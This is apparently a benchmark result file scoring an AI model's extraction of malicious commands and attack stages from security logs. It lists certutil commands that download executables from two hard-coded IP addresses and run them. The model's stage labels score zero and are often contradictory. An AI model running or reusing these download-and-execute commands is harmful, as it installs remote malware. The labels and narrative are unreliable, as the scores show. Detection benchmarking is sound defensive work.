@@ -1,0 +1,82 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacked initiated an initial access through exploiting vulnerabilities via unpatched exploits over HTTP ports. The attackers executed commands and created processes using legitimate tools like certutil and utilizing everyday applications such as Notepad. They also modified registry entries and added new users to gain privileges. Through various lateral movements and privilege escalations they installed malware onto the system, enabling remote execution capabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16676,
+      "completion_tokens": 370,
+      "total_tokens": 17046,
+      "wall_clock_s": 4.637,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.2857142857142857,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 6,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16676,
+      "completion_tokens": 370,
+      "total_tokens": 17046,
+      "wall_clock_s": 4.637,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
